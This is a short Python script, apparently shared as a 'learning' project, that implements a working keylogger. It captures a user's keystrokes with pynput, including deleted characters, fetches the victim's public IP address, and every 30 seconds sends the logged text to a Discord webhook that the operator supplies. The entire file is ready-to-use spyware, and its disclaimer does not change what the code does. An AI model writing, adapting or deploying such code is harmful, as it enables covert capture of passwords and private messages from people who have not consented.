#Made by HazuDev for learning purposes
import os, threading, discord_webhook, time, requests
from pynput.keyboard import Listener

def main():
    os.system("cls")

    print("> This keylogger was made by HazuDev for learning purposes only\n")

    print("/ Starting...")

    loggedData = []
    deletedWords = []

    words = list(map(chr, range(ord("a"), ord("z"))))
    startTime = time.ctime(time.time())

    ip = requests.get("https://ipv4.jsonip.com").json()["ip"]
    webhookURL = "Your webhook URL here" #Remember to put the webhook url here

    def pressed(key):
        key = str(key)[1:-1]

        if key == "ey.ente":
            loggedData.append(" [ENTER] ")

        if key == "ey.backspac":
            try:
                element = loggedData[(len(loggedData) - 1)]

                if element == " [ENTER] ":
                    pass
                else:
                    deletedWords.append(element)
                    del loggedData[(len(loggedData) - 1)]
            except:
                pass

        if key == "ey.spac":
            loggedData.append(" ")

        if key in words:
            loggedData.append(key)

    def saveLogs():
        print("\ Started\n")

        while True:
            print("- Information sent")

            loggedContent = ""
            deletedContent = ""

            try:
                loggedContent = "".join(x for x in loggedData)
            except:
                loggedContent = "None"
            
            try:
                deletedContent = "".join([str(x) for x in reversed(deletedWords)])
            except:
                deletedContent = "None"

            webhook = discord_webhook.DiscordWebhook(url=webhookURL, username="Stuff", content="> Sending information")

            embed = discord_webhook.DiscordEmbed(title="Logged data", color=808080)
            embed.set_description(loggedContent)

            embed.add_embed_field(name="IP", value=ip)
            embed.add_embed_field(name="Start time", value=startTime)
            embed.add_embed_field(name="Deleted words", value=deletedContent)

            webhook.add_embed(embed)
            webhook.execute()

            loggedData.clear()
            deletedWords.clear()

            time.sleep(30)

    thread = threading.Thread(target=saveLogs)
    thread.start()

    with Listener(on_press=pressed) as listener:
        listener.join()

if __name__ == "__main__":
    main()